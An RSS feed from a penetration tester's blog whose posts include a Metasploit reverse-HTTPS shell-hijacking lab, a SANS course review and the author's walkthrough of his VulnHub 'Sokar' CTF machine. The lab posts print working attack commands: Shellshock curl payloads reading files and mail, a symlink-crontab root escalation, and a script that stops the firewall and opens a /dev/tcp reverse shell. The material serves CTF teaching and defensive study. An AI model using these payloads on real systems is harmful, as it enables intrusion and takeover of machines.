<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Guffs on rastamouse.me</title>
    <link>https://rastamouse.me/guff/index.xml</link>
    <description>Recent content in Guffs on rastamouse.me</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 15 Dec 2016 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://rastamouse.me/guff/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Pwning Automize Password Encryption</title>
      <link>https://rastamouse.me/guff/2016/automize/</link>
      <pubDate>Thu, 15 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/guff/2016/automize/</guid>
      <description>&lt;p&gt;&lt;/p&gt;


&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;//www.youtube.com/embed/9Lc2X1RjpZs&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
 &lt;/div&gt;</description>
    </item>
    
    <item>
      <title>Paranoid Meterpreter</title>
      <link>https://rastamouse.me/guff/2015/paranoid-meterpreter/</link>
      <pubDate>Tue, 21 Jul 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/guff/2015/paranoid-meterpreter/</guid>
      <description>&lt;p&gt;There I was, minding my own business… Casually scrolling down my Twitter feed when I noticed a post from &lt;a href=&#34;https://twitter.com/TheColonial&#34;&gt;OJ&lt;/a&gt;, entitled &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers&#34;&gt;The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers&lt;/a&gt;. A bit of a mouthful, it summerises the difference between the WinInet and WinHTTP API’s and what that means for Meterpreter.&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;p&gt;Go ahead and check out that post for the gorey details. I was particularly interested in a feature called ‘Paranoid Meterpreter’, which is basically a means of preventing other people from hijacking your juicy, hard earned shells. This post is a simplistic example of how a Meterpreter shell can be hijacked and how this can be prevented. You can also read HD Moore’s original article &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;the-setup&#34;&gt;The Setup&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;1 x Windows 7: Victim (192.168.56.102)&lt;/li&gt;
&lt;li&gt;1 x Kali: Attacker (192.168.56.103)&lt;/li&gt;
&lt;li&gt;1 x Kali: Super Sneaky Attacker (192.168.56.101)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Windows 7 will be our victim. For the purposes of this post, I will be manually manipulating its &lt;code&gt;hosts&lt;/code&gt; file to simulate a MiTM attack; creating staged EXE payloads and copying them across to execute.&lt;/p&gt;

&lt;p&gt;One Kali VM will be used as a ‘legitimate’ hacker and the other will be used ‘hijack’ their shell.&lt;/p&gt;

&lt;p&gt;The two payloads that I will be using are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Windows Meterpreter Reverse HTTPS Stager (payload/windows/meterpreter/reverse_https) –&amp;gt; This uses the WinInet API.&lt;/li&gt;
&lt;li&gt;Windows Meterpreter Reverse HTTPS Stager (payload/windows/meterpreter/reverse_winhttps) –&amp;gt; This uses the WinHTTP API.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The two payloads don’t appear all that different in the Metasploit Framework and they appear to functional identically if you are not using any of the differentiating features from the respective APIs.&lt;/p&gt;

&lt;h2 id=&#34;scenario-1-wininet&#34;&gt;Scenario 1: WinInet&lt;/h2&gt;

&lt;p&gt;This is the payload the majority of people will likely be familar with, not least because it has been present in the framework for longer.&lt;/p&gt;

&lt;h3 id=&#34;generate-the-payload&#34;&gt;Generate the Payload&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msfvenom -p windows/meterpreter/reverse_https LHOST=kali LPORT=443 -f exe -o /root/wininet.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;handler-exploit&#34;&gt;Handler &amp;amp; Exploit&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf &amp;gt; use exploit/multi/handler
msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_https
msf exploit(handler) &amp;gt; set LHOST kali
msf exploit(handler) &amp;gt; set LPORT 443

msf exploit(handler) &amp;gt; run

[*] Started HTTPS reverse handler on https://0.0.0.0:443/
[*] Starting the payload handler...
[*] 192.168.56.102:49415 (UUID: bba043fc2dfc84a3/x86=1/windows=1/2015-07-21T19:26:35Z) Staging Native payload ...
[*] Meterpreter session 1 opened (192.168.56.103:443 -&amp;gt; 192.168.56.102:49415) at 2015-07-21 20:26:35 +0100
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As we expect, the stager connects back to us and we get a Meterpreter session. Remember, .102 is the victim and .103 the legit hacker.&lt;/p&gt;

&lt;p&gt;Now; if I switch over the DNS entry on the victim, set up an identical handler and run the payload again…&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[*] Started HTTPS reverse handler on https://0.0.0.0:443/
[*] Starting the payload handler...
[*] 192.168.56.102:49521 (UUID: 2eb8181d408393f0/x86=1/windows=1/2015-07-21T19:31:13Z) Staging Native payload ...
[*] Meterpreter session 1 opened (192.168.56.101:443 -&amp;gt; 192.168.56.102:49521) at 2015-07-21 20:31:13 +0100
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The would-be attacker (.101) gets the shell. This is because there is no mutual validation between the stager and the handler.&lt;/p&gt;

&lt;h2 id=&#34;scenario-2-winhttp&#34;&gt;Scenario 2: WinHTTP&lt;/h2&gt;

&lt;p&gt;This API enables Meterpreter to verify the SHA1 hash of the SSL certificate presented by the Framework. This requirement is enforced by both the handler and payload stager.&lt;/p&gt;

&lt;h3 id=&#34;generate-an-ssl-cert&#34;&gt;Generate an SSL Cert&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout meterpreter.key -out meterpreter.crt
cat meterpreter.key meterpreter.crt &amp;gt; meterpreter.pem
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;generate-the-payload-1&#34;&gt;Generate the Payload&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msfvenom -p windows/meterpreter/reverse_winhttps LHOST=kali LPORT=443 HandlerSSLCert=meterpreter.pem StagerVerifySSLCert=true -f exe -o winhttps.exe

[*] Meterpreter will verify SSL Certificate with SHA1 hash 840ad3d3538aa1609061f3e67086ae673ed40579
[*] Writing 73802 bytes to /root/winhttps.exe...
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;handler-exploit-1&#34;&gt;Handler &amp;amp; Exploit&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf &amp;gt; use exploit/multi/handler
msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_winhttps
msf exploit(handler) &amp;gt; set LHOST kali
msf exploit(handler) &amp;gt; set LPORT 443
msf exploit(handler) &amp;gt; set HandlerSSLCert /root/meterpreter.pem
msf exploit(handler) &amp;gt; set StagerVerifySSLCert true
msf exploit(handler) &amp;gt; run

[*] Meterpreter will verify SSL Certificate with SHA1 hash 840ad3d3538aa1609061f3e67086ae673ed40579
[*] Started HTTPS reverse handler on https://0.0.0.0:443/
[*] Starting the payload handler...
[*] 192.168.56.102:50110 (UUID: 2350b0f745ba97df/x86=1/windows=1/2015-07-21T20:57:56Z) Staging Native payload ...
[*] Meterpreter will verify SSL Certificate with SHA1 hash 840ad3d3538aa1609061f3e67086ae673ed40579
[*] Meterpreter session 1 opened (192.168.56.103:443 -&amp;gt; 192.168.56.102:50110) at 2015-07-21 22:00:18 +0100
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we can see that the stager and handler have mutually verified the connection using the SSL cert, and the Meterpreter session becomes available to us as normal.&lt;/p&gt;

&lt;p&gt;Switching the DNS back to the dodgy attacker again…&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[*] Started HTTPS reverse handler on https://0.0.0.0:443/
[*] Starting the payload handler...
[*] 192.168.56.102:50178 (UUID: 2350b0f745ba97df/x86=1/windows=1/2015-07-21T20:57:56Z) Staging Native payload ...
[*] Meterpreter session 2 opened (192.168.56.101:443 -&amp;gt; 192.168.56.102:50178) at 2015-07-21 22:03:16 +0100
[-] Meterpreter session 2 is not valid and will be closed
[*] 192.168.56.102 - Meterpreter session 2 closed.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Because the other attacker does not have the SSL cert, they cannot validate themselves to the Stager and the Meterpreter session closes.&lt;/p&gt;

&lt;h2 id=&#34;moar-paranoia&#34;&gt;Moar Paranoia&lt;/h2&gt;

&lt;p&gt;It’s possible to take this level of paranoia to the next level using UUID validation. In the examples above, we can see that &amp;lsquo;random&amp;rsquo; UUID names are given.  &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/Payload-UUID&#34;&gt;More info here&lt;/a&gt;. But payloads can be assigned specific UUIDs using &lt;code&gt;PayloadUUIDTracking=true&lt;/code&gt; and &lt;code&gt;PayloadUUIDName=&amp;lt;name&amp;gt;&lt;/code&gt; parameters.&lt;/p&gt;

&lt;p&gt;The handler can be given the &lt;code&gt;IgnoreUnknownPayloads&lt;/code&gt; true parameter, so that it will only accept stagers with your own whitelisted UUIDs.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>SANS SEC542 Course Review</title>
      <link>https://rastamouse.me/guff/2015/sans-sec542-course-review/</link>
      <pubDate>Sat, 30 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/guff/2015/sans-sec542-course-review/</guid>
      <description>&lt;p&gt;As some may be aware, in January 2015 I started the SANS &amp;lsquo;&lt;a href=&#34;http://www.sans.org/selfstudy/course/web-app-penetration-testing-ethical-hacking&#34;&gt;SEC542: Web App Penetration Testing and Ethical Hacking&lt;/a&gt;&amp;rsquo; SelfStudy course.  I passed the GWAPT (GIAC Web Application Penetration Tester) certification at the end of May; so I figured I would write up a review of the course and summerise my experience.&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h2 id=&#34;course-syllabus&#34;&gt;Course Syllabus&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;The Attacker&amp;rsquo;s View of the Web&lt;/li&gt;
&lt;li&gt;Reconnaissance and Mapping&lt;/li&gt;
&lt;li&gt;Server-Side Discovery&lt;/li&gt;
&lt;li&gt;Client-Side Discovery&lt;/li&gt;
&lt;li&gt;Exploitation&lt;/li&gt;
&lt;li&gt;Capture the Flag&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;SEC542 was designed to be delivered in the traditional classroom style, over the period of 6 days.  Each syllabus area is covered in roughly 1 day.&lt;/p&gt;

&lt;h2 id=&#34;course-material&#34;&gt;Course Material&lt;/h2&gt;

&lt;p&gt;The course material is covered with a number of different mediums.  The SelfStudy student receives:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Audio Recordings (Online)&lt;/li&gt;
&lt;li&gt;Books&lt;/li&gt;
&lt;li&gt;Data DVD (containing 2 VM&amp;rsquo;s)&lt;/li&gt;
&lt;li&gt;VPN Certificates&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The audio recordings are taken from a live delivery of SEC542 and the &amp;lsquo;books&amp;rsquo; are bound print-outs of the instructors Powerpoint Presentation.  The idea is that you listen to the instructor and follow along with the slides.  Each page is dedicated to a slide, with space to make your own notes etc.  The online recordings can only be accessed for a period of 4 months from your start date; but you could actually download them for offline use (there is no built-in functionality in the portal to do this, but we&amp;rsquo;re hackers, right&amp;hellip;?).&lt;/p&gt;

&lt;p&gt;The DVD contains 2 virtual machines, but unfortunately they are only in VMware format and not something more universal.  SANS stipulate that you require VMWare Player 3.x, VMWare Workstation 7.x or newer or VMWare Fusion.  But I was using VirtualBox on a personal Mac, for which I have not bought Fusion.  Therefore, I had to convert the VMs using a trial version of Fusion.&lt;/p&gt;

&lt;p&gt;The first VM is a customised version of &lt;a href=&#34;http://www.samurai-wtf.org&#34;&gt;SamuraiWTF&lt;/a&gt; (that stands for Web Testing Framework people!), the second is an Ubuntu VM with lots of additional vulnerable applications installed on top.  So these are your &amp;lsquo;attacker&amp;rsquo; and &amp;lsquo;victim&amp;rsquo; VMs, which are used for all of the exercises throughout the course.&lt;/p&gt;

&lt;p&gt;This seems like a good time to mention that even though SANS advertise to have a virtual lab as part of this course, it is only used for the CTF at the end.&lt;/p&gt;

&lt;p&gt;This whole setup works ok for the most part, as you could transfer everything to a laptop and do bits of the course &amp;lsquo;offline&amp;rsquo;, which some people may find convenient.  However, I did experience a few niggly issues.  There appears to be a few instances where the slides/audio vary from the exercise on the VM, as if the material has been updated but the VM hasn&amp;rsquo;t.  For me, this led to a few situations where some of the exercises weren&amp;rsquo;t working as expected; and because you can&amp;rsquo;t &amp;lsquo;see&amp;rsquo; what the instructor is doing it obviously makes it hard for you to confirm what you are doing is correct.&lt;/p&gt;

&lt;h2 id=&#34;topics&#34;&gt;Topics&lt;/h2&gt;

&lt;p&gt;The syllabus areas above are rather broad statements, so which topics are actually covered?  Well, a lot&amp;hellip; To list the major ones:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Spidering&lt;/li&gt;
&lt;li&gt;Information leakage&lt;/li&gt;
&lt;li&gt;Username harvesting&lt;/li&gt;
&lt;li&gt;Command injection&lt;/li&gt;
&lt;li&gt;SQL injection (inc. Blind)&lt;/li&gt;
&lt;li&gt;Cross-Site Scripting (XSS)&lt;/li&gt;
&lt;li&gt;Cross-Site Request Forgery (CSRF)&lt;/li&gt;
&lt;li&gt;Session issues&lt;/li&gt;
&lt;li&gt;Fuzzing&lt;/li&gt;
&lt;li&gt;Client-Side Vulnerabilities (inc. Flash, Java, AJAX)&lt;/li&gt;
&lt;li&gt;Coverage of Tools (inc. BEEF, ZAP, BurpSuite)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This is a &lt;em&gt;lot&lt;/em&gt; of information to digest, so you may not be surprised to hear that SEC542 is not designed to cover any of these areas in any serious depth.  It is certainly more of an entry level course.&lt;/p&gt;

&lt;h2 id=&#34;capture-the-flag&#34;&gt;Capture the Flag&lt;/h2&gt;

&lt;p&gt;You can connect to the lab via VPN at any time during your 4 months of access, where you can practice all of the techniques covered in the course.  It&amp;rsquo;s more of a consolidatory exercise in my eyes, rather than a necessity of the course.  How much benefit you gain from it is going to be personal to you.&lt;/p&gt;

&lt;h2 id=&#34;the-exam&#34;&gt;The Exam&lt;/h2&gt;

&lt;p&gt;The GIAC Certification attempt is an optional extra when purchasing SEC542, so you can take the course and not attempt the certification if you wish.  The exam for the GIAC Silver Certification is a multiple choice test, where you must travel to a proctored test centre to complete.&lt;/p&gt;

&lt;p&gt;What I did like, is that you get 2 free practice exams in your SANS portal, which you can take from home/work/wherever.  You can customise it to tell you when you get a question wrong, and it gives you a pretty good explanation as to why and what the correct answer was.  You can also make it tell you why you got a question correct (which is useful if you just happened to guess a question right).&lt;/p&gt;

&lt;p&gt;At the end of the practice test it gives you a 5-star rating for the different topic areas, so you can identify your strongest areas and those where you may need to put more revision into.&lt;/p&gt;

&lt;p&gt;Both the practice and actual exams give you a checkpoint of your progress at set intervals (I think it&amp;rsquo;s every 15 questions), so you can see if you are above or below the pass mark (which is 70%).&lt;/p&gt;

&lt;p&gt;Oh yeah, and it&amp;rsquo;s open-book&amp;hellip;  You can take in all of the course slides, or any other paper resource (that could even include something like the Web Application Hackers Handbook).  You have a maximum time of 2 hours to complete the 75 questions, but since the course slides for example have no content or index pages there is a potential for you to waste a lot of time looking for things if you rely on them too much.&lt;/p&gt;

&lt;p&gt;This actually makes the exam sound really easy, but there is a level of comprehension required as the information from the course can&amp;rsquo;t just be lifted and applied to the exam questions.&lt;/p&gt;

&lt;h2 id=&#34;giac-gold&#34;&gt;GIAC Gold&lt;/h2&gt;

&lt;p&gt;Passing the exam gives you a &amp;lsquo;silver&amp;rsquo; certification, but if you fork over another ~$600 to SANS you can attempt the &amp;lsquo;gold&amp;rsquo; certification.  This involves writing a paper/technical report with guidance from a SANS Advisor which will then be published in their &lt;a href=&#34;http://www.sans.org/reading-room&#34;&gt;Reading Room&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Sokar: Author&#39;s Narrative</title>
      <link>https://rastamouse.me/guff/2015/sokar-authors-narrative/</link>
      <pubDate>Sat, 21 Feb 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/guff/2015/sokar-authors-narrative/</guid>
      <description>&lt;p&gt;At the very moment I am typing this, ~4 hours remain on the countdown clock for &lt;a href=&#34;http://blog.vulnhub.com/2015/01/competition-sokar.html&#34;&gt;VulnHub&amp;rsquo;s Sokar Competition&lt;/a&gt;.  We have also received about 17 complete write-ups, which I&amp;rsquo;m really pleased with.&lt;/p&gt;

&lt;p&gt;Now, Sokar was never originally designed to be released on VulnHub, let alone feature as a birthday competition.  So this post serves to outline Sokar&amp;rsquo;s origin story, the intended exploitation path and anything else I can think to talk about.&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h2 id=&#34;origin&#34;&gt;Origin&lt;/h2&gt;

&lt;p&gt;On September 24th, the &lt;a href=&#34;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&#34;&gt;Shellshock&lt;/a&gt; vulnerability was disclosed, which understandably, caused a raft of emergency response across businesses.  After we had carried out the necessary patching across our cloud platform, we wanted to go back over all of the server logs to ensure we had not been attacked prior to disclosure.&lt;/p&gt;

&lt;p&gt;The VM which ultimately became Sokar, was solely design to analyse Shellshock from a protective monitoring point of view.&lt;/p&gt;

&lt;p&gt;It was originally handed over to &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;barrebas&lt;/a&gt;, to see what he could make of Shellshock with a restrictive firewall.  The original scenario was to steal data from a MySQL database and to analyse the local log files to identify the attack.&lt;/p&gt;

&lt;p&gt;I suppose he found the experience devilsh enough to suggest I make it available on VulnHub&amp;hellip;&lt;/p&gt;

&lt;h2 id=&#34;the-birthday&#34;&gt;The Birthday&lt;/h2&gt;

&lt;p&gt;I was in no rush to get Sokar (still lacking it&amp;rsquo;s official name) ready for release on VulnHub, but word that I had a VM &amp;lsquo;in development&amp;rsquo; made it to &lt;a href=&#34;https://twitter.com/g0tmi1k&#34;&gt;g0tmi1k&amp;rsquo;s&lt;/a&gt; ears.  He asked if I would like to use this VM as VulnHub&amp;rsquo;s birthday competition.&lt;/p&gt;

&lt;p&gt;Of course, I said yes!  But I had a lot of work to do to make to ready, as there wasn&amp;rsquo;t a great deal of time to go.  Considering I had to build it, and get it through a cycle of beta-testing etc.&lt;/p&gt;

&lt;p&gt;Barrebas was obviously first in the firing line for beta-testing, after all, this was his fault ;).  &lt;a href=&#34;https://twitter.com/thecolonial&#34;&gt;TheColonial&lt;/a&gt; also gracefully stepped up to the plate.&lt;/p&gt;

&lt;h2 id=&#34;walkthrough&#34;&gt;Walkthrough&lt;/h2&gt;

&lt;p&gt;As you will see from the write-ups, there are a bunch of different solutions to Sokar - every stage has an alternate method of exploitation.  Here is my summary of how I designed Sokar to be beaten, and a few words on the alternates.&lt;/p&gt;

&lt;h3 id=&#34;shellshock&#34;&gt;Shellshock&lt;/h3&gt;

&lt;p&gt;I kept Shellshock as the initial exploitation point, which allowed interaction with the local filesystem.  Using this access, the attacker will find the following information:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Bynarr&amp;rsquo;s home directory is world-writable.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -A &#39;() { :;}; echo -en &amp;quot;\r\n\r\n$(/bin/ls -l /home)\r\n\r\n&amp;quot;&#39; 192.168.127.105:591/cgi-bin/cat
drwxrwxrwx. 2 bynarr  bynarr  4096 Feb 17 17:26 bynarr
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Bynarr has his home directory at the front of his PATH.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -A &#39;() { :;}; echo -en &amp;quot;\r\n\r\n$(/bin/cat /home/bynarr/.bash_profile)\r\n\r\n&amp;quot;&#39; 192.168.127.105:591/cgi-bin/cat

# User specific environment and startup programs

PATH=.:$PATH:$HOME/bin
export PATH
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Bynarr owns &lt;code&gt;/tmp/stats&lt;/code&gt;, which is updated every minute.  The logical inference is that a cronjob is running.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -A &#39;() { :;}; echo -en &amp;quot;\r\n\r\n$(/bin/ls -l /tmp/)\r\n\r\n&amp;quot;&#39; 192.168.127.105:591/cgi-bin/cat
-rw-rw-r-- 1 bynarr  bynarr        951 Feb 21 15:14 stats
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;The contents of &lt;code&gt;/tmp/stats&lt;/code&gt; is generated using &lt;code&gt;date&lt;/code&gt;, &lt;code&gt;uptime&lt;/code&gt;, &lt;code&gt;netstat&lt;/code&gt; and &lt;code&gt;iostat&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Writing a binary called &lt;code&gt;iostat&lt;/code&gt; into &lt;code&gt;/home/bynarr&lt;/code&gt; will get executed when the cron is run (the &lt;code&gt;iostat&lt;/code&gt; path is not hardcoded in the job).&lt;/p&gt;

&lt;p&gt;The final hurdle is the outbound firewall rules.  Those who tried to initiate a reverse shell will have been unsuccessful - the &lt;code&gt;apache&lt;/code&gt; user is restricted to the following rules:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-A INPUT -m state --state NEW,ESTABLISHED -p tcp --dport 591 -j ACCEPT
-A OUTPUT -m state --state ESTABLISHED -p tcp --sport 591 -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;There is a world-readable email from root to bynarr.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -A &#39;() { :;}; echo -en &amp;quot;\r\n\r\n$(/bin/ls -l /var/spool/mail)\r\n\r\n&amp;quot;&#39; 192.168.127.105:591/cgi-bin/cat
-rw-rw-r--. 1 bynarr  mail 551 Dec 30 21:09 bynarr

root@kali:~# curl -A &#39;() { :;}; echo -en &amp;quot;\r\n\r\n$(/bin/cat /var/spool/mail/bynarr)\r\n\r\n&amp;quot;&#39; 192.168.127.105:591/cgi-bin/cat
...
Password &#39;fruity&#39;.
...
outbound ephemeral port access on 51242
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This outgoing port is made possible by the following firewall rule:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --gid-owner 501 -p tcp --dport 51242 -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, a reverse shell as bynarr on port 51242 is possible using this method.  However as some of you know, there were ways around this restriction.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Because bynarr&amp;rsquo;s password was available in the email, an elaborate &lt;code&gt;su&lt;/code&gt; could be done using a &lt;code&gt;python pty&lt;/code&gt; import.  This allowed execution as bynarr, but it didn&amp;rsquo;t really make it any easier to get a shell out of the system.&lt;/li&gt;
&lt;li&gt;IPv6 was left enabled on the system, but no firewall rules were applied.  This means that there were no restrictions on incoming/outgoing connections on IPv6.  For those who realised this, a &lt;code&gt;netcat&lt;/code&gt; reverse shell was very easy.  A &lt;code&gt;python pty&lt;/code&gt; import and a &lt;code&gt;su&lt;/code&gt; to bynarr was probably the easiest method of getting a shell.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Keeping IPv6 enabled was a slip-up on my part.  But it sure as hell goes to show what a risk it can be if left running and not managed correctly.  Finally, Shellshock also allowed for some other attacks, which took you straight to root - most notable being against DHCP.&lt;/p&gt;

&lt;h3 id=&#34;lime&#34;&gt;LiME&lt;/h3&gt;

&lt;p&gt;The next step was to perform a memory dump, using the LiME kernel module.  I wrote a bash wrapper around this, as it was easier to integrate it into &lt;code&gt;sudo&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[bynarr@sokar ~]$ sudo -l

User bynarr may run the following commands on this host:
    (ALL) NOPASSWD: /home/bynarr/lime
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I think everybody get through this part as intended - that is to perform a memory dump and extract the password hash for apophis.  It was a weak password that could be cracked using &lt;code&gt;john&lt;/code&gt; in just a few minutes.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[bynarr@sokar ~]$ strings /tmp/ram | grep &#39;apophis&#39;
apophis:$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::

root@kali:~# john apophis --wordlist=/usr/share/wordlists/rockyou.txt 
Loaded 1 password hash (sha512crypt [64/64])
overdrive        (apophis)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There is an alternate solution which allows elevation to root - credit for this totally goes to TheColonial.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Create a symlink from &lt;code&gt;/tmp/ram&lt;/code&gt; to &lt;code&gt;/etc/crontab&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[bynarr@sokar ~]$ ln -s /etc/crontab /tmp/ram

&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;This little python script will attempted to hold a string in memory.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[bynarr@sokar ~]$ cat cron.py
print &amp;quot;* * * * * root /bin/bash /home/bynarr/boom&amp;quot;
raw_input()
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;boom&lt;/code&gt; itself, is a shell script to do &amp;lsquo;something&amp;rsquo;.  In my example, it will kill the firewall and return a new shell.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[bynarr@sokar ~]$ cat boom
/etc/init.d/iptables stop
/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.127.101/4444 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running &lt;code&gt;lime&lt;/code&gt; will now dump the content of RAM straight into &lt;code&gt;/etc/crontab&lt;/code&gt;.  Thankfully, it is rather forgiving and will ignore everything which doesn&amp;rsquo;t match the correct syntax.  But with any luck, the injected string will end up in there and executed.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.127.101] from (UNKNOWN) [192.168.127.105] 34026
bash-4.1# /usr/bin/id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The sad part about this, is that OJ warned me it was possible in the previous implementation of LiME.  Originally, I had the following contents in &lt;code&gt;/etc/sudoers&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;%forensic   ALL=(ALL)    NOPASSWD: /sbin/insmod /home/bynarr/lime.ko *; /sbin/rmmod lime
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The output path and format was wildcarded for the attacker to chose and OJ was able to specify &lt;code&gt;/etc/crontab&lt;/code&gt; directly.  I had been careful to make &lt;code&gt;lime.ko&lt;/code&gt; immutable so it couldn&amp;rsquo;t be replaced with a different module, and I wrote the bash wrapper to hardcode the paths (and make it a little more user-friendly).  But I failed to take into consideration the symlink method.&lt;/p&gt;

&lt;p&gt;To fix the problem properly, I should have hardcoded the path to something like &lt;code&gt;/home/bynarr/ram&lt;/code&gt; and &lt;code&gt;touch /home/bynarr/ram&lt;/code&gt; as root (also ensuring another user could not move it etc).&lt;/p&gt;

&lt;h3 id=&#34;git&#34;&gt;Git&lt;/h3&gt;

&lt;p&gt;This &lt;code&gt;build&lt;/code&gt; binary contains an encrypted (XOR&amp;rsquo;d) string, which is decrypted at runtime and passed to &lt;code&gt;system()&lt;/code&gt;.  The command initiates a &lt;code&gt;git clone&lt;/code&gt; over SSH.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[apophis@sokar ~]$ ls -l
-rwsr-sr-x 1 root root 8430 Jan  2 17:49 build
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There is also a BOF written into the &lt;code&gt;Y/N&lt;/code&gt; input field, but this was more of a red herring - there are a lot of protections in place to make exploitation rather difficult.  The intended path was to hijack the DNS of sokar and clone an evil repo.  The running version of git is vulnerable to malicious git tree&amp;rsquo;s on case insensitive filesystems.&lt;/p&gt;

